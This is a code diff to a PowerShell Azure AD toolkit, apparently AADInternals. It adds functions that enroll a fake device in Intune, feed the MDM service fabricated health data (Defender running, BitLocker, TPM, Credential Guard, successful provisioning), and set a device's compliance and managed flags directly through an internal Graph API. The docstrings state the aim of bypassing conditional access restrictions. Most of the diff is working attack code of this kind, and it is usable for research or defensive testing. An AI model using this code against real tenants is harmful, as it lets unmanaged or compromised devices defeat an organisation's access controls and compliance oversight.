@@ -6,12 +6,12 @@ function Join-DeviceToIntune
 {
 <#
     .SYNOPSIS
-    Registers (enrolls) the given device to Azure AD.
+    Registers (enrolls) the given device to Intune.
 
     .DESCRIPTION
-    Enrolls the given device to Azure AD and generates a corresponding certificate.
+    Enrolls the given device to Intune and generates a corresponding certificate.
 
-    After enrollment, the device is in compliant state, which allows bypassing conditional access (CA) restrictions based on the compliance.
+    After enrollment, the device is in compliant state (depends on the Intune configuration), which allows bypassing conditional access (CA) restrictions based on the compliance.
 
     The certificate has no password.
 
@@ -56,7 +56,16 @@ function Join-DeviceToIntune
             throw "No device id included in access token! Use Get-AADIntAccessTokenForIntuneMDM with the device certificate and try again."
         }
 
-        $joinInfo = Enroll-DeviceToMDM -AccessToken $AccessToken -DeviceName $DeviceName
+        
+        try
+        {
+            $joinInfo = Enroll-DeviceToMDM -AccessToken $AccessToken -DeviceName $DeviceName
+        }
+        catch
+        {
+            Write-Error $_.ErrorDetails.Message
+            return
+        }
 
         # Get the certificates
         $CA =                $joinInfo[0]
@@ -119,19 +128,15 @@ function Start-DeviceIntuneCallback
         [string]$PfxPassword,
 
         [Parameter(Mandatory=$True)]
-        [string]$DeviceName
+        [string]$DeviceName,
+        [Parameter(Mandatory=$False)]
+        [ValidateSet("User","Others","None")]
+        [string]$Scope="None",
+        [Parameter(Mandatory=$False)]
+        [int]$SessionId=1
     )
-    Process
+    Begin
     {
-        if(!$Certificate)
-        {
-            $Certificate = Load-Certificate -FileName $PfxFileName -Password $PfxPassword -Exportable
-        }
-
-        # Initialise some variables
-        $sessionId = 1 #Get-Random -Minimum 1 -Maximum 256 # Stays the same for the whole "conversation"
-        $msgId =     1 # Increased by one per message
-        
         # CPS Version xml 
         $CSPVersions = @"
 <?xml version="1.0" encoding="utf-8"?>
@@ -299,9 +304,36 @@ function Start-DeviceIntuneCallback
 	</Capabilities>
 </DeviceManageability>
 "@
+    }
+    Process
+    {
+        if(!$Certificate)
+        {
+            $Certificate = Load-Certificate -FileName $PfxFileName -Password $PfxPassword -Exportable
+        }
+
+        # Initialise some variables
+        #$sessionId = 1 
+        $msgId =     1 # Increased by one per message
+        $hwId = (Convert-ByteArrayToHex -Bytes ([System.Security.Cryptography.HashAlgorithm]::Create('sha256').ComputeHash([text.encoding]::UTF8.GetBytes($DeviceName)))).ToUpper()
+        $encDeviceName=[System.Web.HttpUtility]::HtmlEncode($DeviceName)
+
+        $tenantId = (New-Guid).ToString()
+        
       
         # The default settings
         $settings = @{
+                "./cimv2/Win32_OperatingSystem" = "Win32_OperatingSystem=@"
+                "./cimv2/Win32_LogicalDisk" =     "Win32_LogicalDisk.DeviceID=""C:""/Win32_LogicalDisk.DeviceID=""D:"""
+                "./cimv2/Win32_OperatingSystem/Win32_OperatingSystem%3D%40/SystemDrive" = "C:"
+
+                "./cimv2/MDM_ConfigSetting/MDM_ConfigSetting.SettingName=%22AccountId%22/SettingValue" = "36684b40-1895-4ebf-b11d-b465be552b2f"
+                "./cimv2/MDM_ConfigSetting/MDM_ConfigSetting.SettingName3D%22AccountId%22/SettingValue" = "36684b40-1895-4ebf-b11d-b465be552b2f"
+                "./cimv2/MDM_ConfigSetting/MDM_ConfigSetting.SettingName=%22ClientHealthStatus%22/SettingValue" = ""
+                "./cimv2/MDM_ConfigSetting/MDM_ConfigSetting.SettingName=%22ClientDeploymentErrorCode%22/SettingValue" = ""
+                "./cimv2/MDM_ConfigSetting/MDM_ConfigSetting.SettingName=%22ClientHealthLastSyncTime%22/SettingValue" = ""
+
+
                 "./DevInfo/DevId" = $DeviceName
                 "./DevInfo/Man" =   "Microsoft Corporation"
                 "./DevInfo/Mod" =   "Virtual Machine"
@@ -309,39 +341,141 @@ function Start-DeviceIntuneCallback
                 "./DevInfo/Lang" =  "en-US"
 
                 "./DevDetail/SwV" =    "10.0.18363.1016"
-                "./DevDetail/OEM" =    "Microsoft"
+                "./DevDetail/FwV" =    "Hyper-V UEFI Release v4.0"
+                "./DevDetail/HwV" =    "Hyper-V UEFI Release v4.0"
+                "./DevDetail/OEM" =    "Microsoft Corporation"
                 "./DevDetail/DevTyp" = "Virtual Machine"
 
                 "./DevDetail/Ext/Microsoft/LocalTime" =             "$((Get-Date).ToString("yyyy-MM-ddTHH:mm:ss").Replace(".",":")).$((Get-Date).ToString("fffffffK"))"
-                "./DevDetail/Ext/Microsoft/DeviceName" =            $DeviceName
-                "./DevDetail/Ext/Microsoft/DNSComputerName" =       $DeviceName
+                "./DevDetail/Ext/Microsoft/DeviceName" =            $encDeviceName
+                "./DevDetail/Ext/Microsoft/DNSComputerName" =       $encDeviceName
                 "./DevDetail/Ext/Microsoft/OSPlatform" =            "Windows 10 Enterprise"
                 "./DevDetail/Ext/Microsoft/ProcessorArchitecture" = "9"
                 "./DevDetail/Ext/Microsoft/ProcessorType" =         "8664"
                 "./DevDetail/Ext/Microsoft/TotalRAM" =              "1"
                 "./DevDetail/Ext/Microsoft/TotalStorage" =          "1"
+                "./DevDetail/Ext/Microsoft/SMBiosSerialNumber" =    "0000-0000-0000-0000-0000-0000-00"
+                "./DevDetail/Ext/Microsoft/MobileID" =              "Not Present"
 
+                "./Vendor/MSFT/eUICCs" = "com.microsoft/1.2/MDM/eUICCs"
+
+                "./Vendor/MSFT/EnterpriseModernAppManagement/AppManagement/nonStore" = "Mimikatz"
+                "./Vendor/MSFT/EnterpriseModernAppManagement/AppManagement/AppStore" = ""
+
+                "./Vendor/MSFT/NodeCache/MS%20DM%20Server" =              "CacheVersion/Nodes/ChangedNodes/ChangedNodesData"
+                "./Vendor/MSFT/NodeCache/MS%20DM%20Server/CacheVersion" = ""
+                "./Vendor/MSFT/NodeCache/MS%20DM%20Server/ChangedNodes" = ""
 
                 "./Vendor/MSFT/WindowsLicensing/Edition" =                     "4"
+                "./Vendor/MSFT/WindowsLicensing/Status" =                      "3" # Completed
+                "./Vendor/MSFT/WindowsLicensing/SMode/Status" =                "0" # Successfully switched out of S mode
+
                 "./Vendor/MSFT/Update/LastSuccessfulScanTime" =                (Get-Date).AddMinutes(-10).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
+                "./Vendor/MSFT/Update/InstallableUpdates" =                    ""
+                "./Vendor/MSFT/Update/PendingRebootUpdates" =                  ""
+                 
+                "./Vendor/MSFT/DeviceStatus/NetworkIdentifiers" = "000000000000"
+                "./Vendor/MSFT/DeviceStatus/NetworkIdentifiers/000000000000/IPAddressV4" =  "192.168.0.2"
+                "./Vendor/MSFT/DeviceStatus/NetworkIdentifiers/000000000000/IPAddressV6" =  ""
+                "./Vendor/MSFT/DeviceStatus/NetworkIdentifiers/000000000000/IsConnected" =  "true"
+                "./Vendor/MSFT/DeviceStatus/NetworkIdentifiers/000000000000/Type" =         "1" # 1=LAN, 2=WLAN
+
                 "./Vendor/MSFT/DeviceStatus/OS/Mode" =                         "0"
                 "./Vendor/MSFT/DeviceStatus/OS/Edition" =                      "4"
+                "./Vendor/MSFT/DeviceStatus/CellularIdentities" =               "" 
                 "./Vendor/MSFT/DeviceStatus/Compliance/EncryptionCompliance" = "true"
+
+                "./Vendor/MSFT/PassportForWork/$tenantId/Policies/UsePassportForWork" =              "true"
+                "./Vendor/MSFT/PassportForWork/$tenantId/Policies/RequireSecurityDevice" =           "true"
+                "./Vendor/MSFT/PassportForWork/$tenantId/Policies/PINComplexity/MinimumPINLength" =  "6"
+                "./Vendor/MSFT/PassportForWork/$tenantId/Policies/PINComplexity/MaximumPINLength" =  "127"
+                "./Vendor/MSFT/PassportForWork/$tenantId/Policies/PINComplexity/UppercaseLetters" =  "1" # 0=allowed, 1=required, 2=not allowed
+                "./Vendor/MSFT/PassportForWork/$tenantId/Policies/PINComplexity/LowercaseLetters" =  "1" # 0=allowed, 1=required, 2=not allowed
+                "./Vendor/MSFT/PassportForWork/$tenantId/Policies/PINComplexity/SpecialCharacters" = "1" # 0=allowed, 1=required, 2=not allowed
+                "./Vendor/MSFT/PassportForWork/$tenantId/Policies/PINComplexity/Digits" =            "1" # 0=allowed, 1=required, 2=not allowed
+                "./Vendor/MSFT/PassportForWork/$tenantId/Policies/PINComplexity/History" =           "1" # 0=allowed, 1=required, 2=not allowed
+                "./Vendor/MSFT/PassportForWork/$tenantId/Policies/PINComplexity/Expiration" =        "50" # 0-50
+                "./Vendor/MSFT/PassportForWork/$tenantId/Policies/Remote/UseRemotePassport" =        "false"
+
+                "./Vendor/MSFT/PassportForWork/Biometrics/UseBiometrics" = "true"
+                "./Vendor/MSFT/PassportForWork/Biometrics/FacialFeaturesUseEnhancedAntiSpoofing" = "true"
+
+
+
+
+
+                "./Vendor/MSFT/DeviceStatus/TPM/SpecificationVersion" = "2.0"
+
+                "./Vendor/MSFT/DeviceStatus/DomainName" = ""
+
+                "./Vendor/MSFT/DeviceStatus/DeviceGuard/LsaCfgCredGuardStatus" =             "0" # Running
+                "./Vendor/MSFT/DeviceStatus/DeviceGuard/VirtualizationBasedSecurityHwReq" =  "0" # System meets hardware configuration requirements
+                "./Vendor/MSFT/DeviceStatus/DeviceGuard/VirtualizationBasedSecurityStatus" = "0" # Running
+
+                "./Vendor/MSFT/DeviceStatus/Battery/EstimatedRuntime" =         "-1" # AC connected
+                "./Vendor/MSFT/DeviceStatus/Battery/EstimatedChargeRemaining" = "-1" # AC
+
+                "./Vendor/MSFT/DeviceInstanceService/PhoneNumber" = "1234567890"
+
+                "./Vendor/MSFT/Defender/Detections" = ""
+
+                "./Vendor/MSFT/Defender/Health" =                              "ProductStatus/ComputerState/DefenderEnabled/RtpEnabled/NisEnabled/QuickScanOverdue/FullScanOverdue/SignatureOutOfDate/RebootRequired/FullScanRequired/EngineVersion/SignatureVersion/DefenderVersion/QuickScanTime/FullScanTime/QuickScanSigVersion/FullScanSigVersion/TamperProtectionEnabled/IsVirtualMachine"
+                "./Vendor/MSFT/Defender/Health/ProductStatus" =                "0"
+                "./Vendor/MSFT/Defender/Health/ComputerState" =                "0"
                 "./Vendor/MSFT/Defender/Health/TamperProtectionEnabled" =      "true"
+                "./Vendor/MSFT/Defender/Health/DefenderEnabled" =              "true"
+                "./Vendor/MSFT/Defender/Health/RtpEnabled" =                   "true"
+                "./Vendor/MSFT/Defender/Health/NisEnabled" =                   "true"
+                "./Vendor/MSFT/Defender/Health/QuickScanOverdue" =             "false"
+                "./Vendor/MSFT/Defender/Health/FullScanOverdue" =              "false"
+                "./Vendor/MSFT/Defender/Health/SignatureOutOfDate" =           "false"
+                "./Vendor/MSFT/Defender/Health/RebootRequired" =               "false"
+                "./Vendor/MSFT/Defender/Health/FullScanRequired" =             "false"
+                "./Vendor/MSFT/Defender/Health/EngineVersion" =                "1.1.17400.5"
+                "./Vendor/MSFT/Defender/Health/SignatureVersion" =             "1.323.410.0"
+                "./Vendor/MSFT/Defender/Health/DefenderVersion" =              "4.18.2008.9"
+                "./Vendor/MSFT/Defender/Health/QuickScanTime" =                (Get-Date).AddHours(-1).ToUniversalTime().ToString("MM/dd/yyyy HH:mm:ss UTC")
+                "./Vendor/MSFT/Defender/Health/FullScanTime" =                 (Get-Date).AddHours(-2).ToUniversalTime().ToString("MM/dd/yyyy HH:mm:ss UTC")
+                "./Vendor/MSFT/Defender/Health/QuickScanSigVersion" =          "1.321.2151.0"
+                "./Vendor/MSFT/Defender/Health/FullScanSigVersion" =           "1.321.2151.0"
+                "./Vendor/MSFT/Defender/Health/IsVirtualMachine" =             "true"
 
                 "./Vendor/MSFT/DMClient/Provider/MS%20DM%20Server/EntDMID" =       "0"
-                "./Vendor/MSFT/DMClient/Provider/MS%20DM%20Server/EntDeviceName" = "$DeviceName mgmt"
+                "./Vendor/MSFT/DMClient/Provider/MS%20DM%20Server/EntDeviceName" = "$encDeviceName mgmt"
+                "./Vendor/MSFT/DMClient/Provider/MS%20DM%20Server/AADResourceID" = "https://manage.microsoft.com"
+
+                "./Vendor/MSFT/DMClient/Provider/MS%20DM%20Server/Poll/IntervalForRemainingScheduledRetries" = "480"
+                "./Vendor/MSFT/DMClient/Provider/MS%20DM%20Server/Poll/PollOnLogin" =                          "false"
+
+                "./Vendor/MSFT/DMClient/HWDevID" = $hwId
+
+                "./Vendor/MSFT/HealthAttestation/Status" = "3" # DHA-Data is ready for pic up
+                "./Vendor/MSFT/Update/FailedUpdates" = ""
+                
+
+                "./Vendor/MSFT/Office/Installation/CurrentStatus" = "" # XML of current Office 365 installation status on the device
 
                 "./Device/Vendor/MSFT/DeviceManageability/Capabilities/CSPVersions" = [Security.SecurityElement]::Escape($CSPVersions)
+                "./Device/Vendor/MSFT/BitLocker/Status/DeviceEncryptionStatus" = "0" # Compliant
+
+                "./Device/Vendor/MSFT/DMClient/Provider/MS%20DM%20Server/FirstSyncStatus/IsSyncDone" = "true"
+                "./Device/Vendor/MSFT/DMClient/Provider/MS%20DM%20Server/FirstSyncStatus/SkipDeviceStatusPage" = "true"
+                "./Device/Vendor/MSFT/DMClient/Provider/MS%20DM%20Server/FirstSyncStatus/SkipUserStatusPage" = "true"
+                "./Device/Vendor/MSFT/DMClient/Provider/MS%20DM%20Server/FirstSyncStatus/TimeOutUntilSyncFailure" = "60"
+                "./Device/Vendor/MSFT/DMClient/Provider/MS%20DM%20Server/FirstSyncStatus/ServerHasFinishedProvisioning" = "true" 
+                "./Device/Vendor/MSFT/DMClient/Provider/MS%20DM%20Server/FirstSyncStatus/WasDeviceSuccessfullyProvisioned" = "1" # 0=failure, 1=success, 2=in progress
+
+                
             }
 
         
         # Initial commands
         $commands = @()
         $commands += New-Object psobject -Property @{"Type" = "Alert"; "Data" = "1201"; CmdID = 1 }
+        $commands += New-Object psobject -Property @{"Type" = "Alert"; "Data" = "1224"; CmdID = 2 ; "ItemData"= ($Scope.ToLower()) ; "MetaType"="com.microsoft/MDM/LoginStatus"}
         $attr = [ordered]@{
             Type =  "Replace"
-            CmdID = 2 
+            CmdID = 3 
             Items = @{
                 "./DevInfo/DevId" = $DeviceName
                 "./DevInfo/Man" =   "Microsoft Corporation"
@@ -358,7 +492,7 @@ function Start-DeviceIntuneCallback
             $f=$msgId
 
             Write-Verbose "=> Sending message   ($f) with $($commands.Count) commands."
-            $req = New-SyncMLRequest -commands $commands -DeviceName $DeviceName -SessionID $sessionId -MsgID ($msgId++)
+            $req = New-SyncMLRequest -commands $commands -DeviceName $encDeviceName -SessionID $sessionId -MsgID ($msgId++)
 
             # Debug
             if($DebugPreference)
@@ -383,6 +517,289 @@ function Start-DeviceIntuneCallback
 
         }
         
+
+    }
+}
+
+# Remove the device from intune
+# Sep 7th
+function Remove-DeviceFromIntune
+{
+<#
+    .SYNOPSIS
+    Removes (un-enrolls) the given device from Intune.
+
+    .DESCRIPTION
+    Removes the given device to from Intune.
+
+    .Parameter Certificate
+    x509 certificate of the device.
+
+    .Parameter PfxFileName
+    File name of the .pfx certificate of the device.
+
+    .Parameter PfxPassword
+    The password of the .pfx certificate of the device.
+
+    .EXAMPLE
+    Remove-AADIntAccessDeviceFromIntune -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7.pfx 
+
+
+#>
+    [cmdletbinding()]
+    Param(
+        [Parameter(ParameterSetName='Certificate',Mandatory=$True)]
+        [System.Security.Cryptography.X509Certificates.X509Certificate2]$Certificate,
+
+        [Parameter(ParameterSetName='FileAndPassword',Mandatory=$True)]
+        [string]$PfxFileName,
+        [Parameter(ParameterSetName='FileAndPassword',Mandatory=$False)]
+        [string]$PfxPassword
+    )
+    Process
+    {
+        if(!$Certificate)
+        {
+            $Certificate = Load-Certificate -FileName $PfxFileName -Password $PfxPassword -Exportable
+        }
+
+        # Get the device id from the certificate
+        $deviceId = $Certificate.Subject.Split("=")[1]
+
+        $requestId = (New-Guid).ToString()
+
+        $headers=@{
+            "Accept" =                   "application/json1"
+            "Accept-Charset" =           "UTF-8"
+            "User-Agent" =               "Dsreg/10.0 (Windows 10.0.18363.0)"
+            "ocp-adrs-client-name" =     "Dsreg"
+            "ocp-adrs-client-version" =  "10.0.18362.0"
+            "return-client-request-id" = "true"
+            "client-Request-Id" =        $requestId
+        }
+
+        try
+        {
+            Write-Verbose "Removing device $deviceId from Intune. Request Id: $requestId"
+            $response = Invoke-WebRequest -UseBasicParsing -Certificate $Certificate -Method Delete -Uri "https://enterpriseregistration.windows.net/EnrollmentServer/device/$($deviceId)?api-version=1.0" -Headers $headers -ErrorAction SilentlyContinue
+            Write-Verbose "Device $deviceId removed from Intune."
+        }
+        catch
+        {
+            if($_.ErrorDetails.Message)
+            {
+                throw ($_.ErrorDetails.Message | Convertfrom-Json).message
+            }
+            else
+            {
+                throw "Remove failed! $($_.message)"
+            }
+        }
+
+        return $response
+            
+    }
+}
+
+
+
+# Get's device compliance
+# Sep 11th 2020
+function Get-DeviceCompliance
+{
+<#
+    .SYNOPSIS
+    Gets the device compliance status.
+
+    .DESCRIPTION
+    Gets the user's device compliance status using AAD Graph API. Does not require admin rights!
+
+    .Parameter AccessToken
+    The access token used to set the compliance.
+
+    .Parameter DeviceId
+    Azure AD device id of the device.
+
+    .Parameter ObjectId
+    Azure AD object id of the device.
+
+    .Parameter All
+    Returns all devices.
+
+    .Parameter My
+    Returns all user's devices.
+
+    .EXAMPLE
+    Get-AADIntAccessTokenForAADGraph -SaveToCache
+
+    PS C\:>Get-AADIntDeviceCompliance -DeviceId "d03994c9-24f8-41ba-a156-1805998d6dc7"
+
+    displayName     : SixByFour
+    objectId        : 2eaa21a1-6362-4d3f-afc4-597592217ef0
+    deviceId        : d03994c9-24f8-41ba-a156-1805998d6dc7
+    isCompliant     : False
+    isManaged       : True
+    deviceOwnership : Company
+
+    .EXAMPLE
+    Get-AADIntAccessTokenForAADGraph -SaveToCache
+
+    PS C\:>Get-AADIntDeviceCompliance -My | ft
+
+    displayName   objectId                             deviceId                             isCompliant isManaged deviceOwnership
+    -----------   --------                             --------                             ----------- --------- ---------------
+    SixByFour     2eaa21a1-6362-4d3f-afc4-597592217ef0 d03994c9-24f8-41ba-a156-1805998d6dc7       False      True Company
+    DESKTOP-X4LCS 8ba68233-4d2b-4331-8b8b-27bc53204d8b c9dcde64-5d0f-4b3c-b711-cb6947837dc2       False      True Company
+    SM-1234       c00af9fe-108e-446b-aeee-bf06262973dc 74080692-fb38-4a7b-be25-27d9cbf95705                       Personal
+#>
+    [cmdletbinding()]
+    Param(
+        [Parameter(Mandatory=$False)]
+        [String]$AccessToken,
+        [Parameter(ParameterSetName='DeviceID',Mandatory=$True)]
+        [String]$DeviceId,
+        [Parameter(ParameterSetName='ObjectID',Mandatory=$True)]
+        [String]$ObjectId,
+        [Parameter(ParameterSetName='All',Mandatory=$True)]
+        [Switch]$All,
+        [Parameter(ParameterSetName='My',Mandatory=$True)]
+        [Switch]$My
+    )
+    Process
+    {
+        # Get from cache if not provided
+        $AccessToken = Get-AccessTokenFromCache -AccessToken $AccessToken -ClientID "1b730954-1685-4b74-9bfd-dac224a7b894" -Resource "https://graph.windows.net"
+
+        $parsedToken = Read-Accesstoken -AccessToken $AccessToken
+
+        $tenantId = $parsedToken.tid
+
+        $headers=@{
+            "Authorization" = "Bearer $AccessToken"
+            "Accept" =        "application/json;odata=nometadata"
+        }
+
+        
+        # Get the object Id if not given
+        if(!$All -and !$My -and [string]::IsNullOrEmpty($ObjectId))
+        {
+            $ObjectId = Get-DeviceObjectId -DeviceId $DeviceId -TenantId $tenantId -AccessToken $AccessToken
+        }
+
+        $select="`$select=displayName,objectId,deviceId,isCompliant,isManaged,deviceOwnership,deviceManagementAppId"
+
+        if($All)
+        {
+            $url="https://graph.windows.net/$tenantId/devices?$select&api-version=1.61-internal"
+        }
+        elseif($My)
+        {
+            $url="https://graph.windows.net/Me/ownedDevices?$select&api-version=1.61-internal"
+        }
+        else
+        {
+            $url="https://graph.windows.net/$tenantId/devices/$($ObjectId)?$select&api-version=1.61-internal"
+        }
+
+        $response = Invoke-RestMethod -Method Get -Uri $url -Headers $headers
+
+        if($response.value)
+        {
+            return $response.value
+        }
+        else
+        {
+            return $response
+        }
+
+    }
+}
+
+
+
+
+# Set's device compliance
+# Sep 11th 2020
+function Set-DeviceCompliant
+{
+<#
+    .SYNOPSIS
+    Sets the device compliant.
+
+    .DESCRIPTION
+    Sets the user's device compliant using AAD Graph API. Does not require admin rights.
+    Compliant and managed statuses can be used in conditional access (CA) rules.
+
+    .Parameter AccessToken
+    The access token used to set the compliance.
+
+    .Parameter DeviceId
+    Azure AD device id of the device.
+
+    .Parameter ObjectId
+    Azure AD object id of the device.
+
+    .EXAMPLE
+    Get-AADIntAccessTokenForAADGraph -SaveToCache
+
+    PS C\:>Set-AADIntDeviceCompliant -DeviceId "d03994c9-24f8-41ba-a156-1805998d6dc7"
+
+    displayName     : SixByFour
+    objectId        : 2eaa21a1-6362-4d3f-afc4-597592217ef0
+    deviceId        : d03994c9-24f8-41ba-a156-1805998d6dc7
+    isCompliant     : True
+    isManaged       : True
+    deviceOwnership : 
+#>
+    [cmdletbinding()]
+    Param(
+        [Parameter(Mandatory=$False)]
+        [String]$AccessToken,
+        [Parameter(ParameterSetName='DeviceID',Mandatory=$True)]
+        [String]$DeviceId,
+        [Parameter(ParameterSetName='ObjectID',Mandatory=$True)]
+        [String]$ObjectId,
+        [Switch]$Compliant,
+        [Switch]$Managed,
+        [Switch]$Intune
+    )
+    Process
+    {
+        # Get from cache if not provided
+        $AccessToken = Get-AccessTokenFromCache -AccessToken $AccessToken -ClientID "1b730954-1685-4b74-9bfd-dac224a7b894" -Resource "https://graph.windows.net"
+
+        $parsedToken = Read-Accesstoken -AccessToken $AccessToken
+
+        $tenantId = $parsedToken.tid
+
+        $body=@{}
+
+        if($Compliant) {$body["isCompliant"] = "true"}
+        if($Managed)   {$body["isManaged"] =   "true"}
+        if($Intune)    {$body["deviceManagementAppId"] = "0000000a-0000-0000-c000-000000000000"}
+
+
+        #$body=@{
+        #    "isManaged" =             "true"
+        #    "isCompliant" =           "true"
+
+            #"deviceManagementAppId" = "0000000a-0000-0000-c000-000000000000"
+        #}
+
+        $headers=@{
+            "Authorization" = "Bearer $AccessToken"
+        }
+
+        # Get the object Id if not given
+        if([string]::IsNullOrEmpty($ObjectId))
+        {
+            $ObjectId = Get-DeviceObjectId -DeviceId $DeviceId -TenantId $tenantId -AccessToken $AccessToken
+        }
+
+        # Set the device compliance
+        Invoke-RestMethod -Method Patch -Uri "https://graph.windows.net/$tenantId/devices/$ObjectId`?api-version=1.61-internal" -Headers $headers -Body ($body|ConvertTo-Json) -ContentType "application/json"
+
+        Get-DeviceCompliance -ObjectId $ObjectId -AccessToken $AccessToken
 
     }
 }
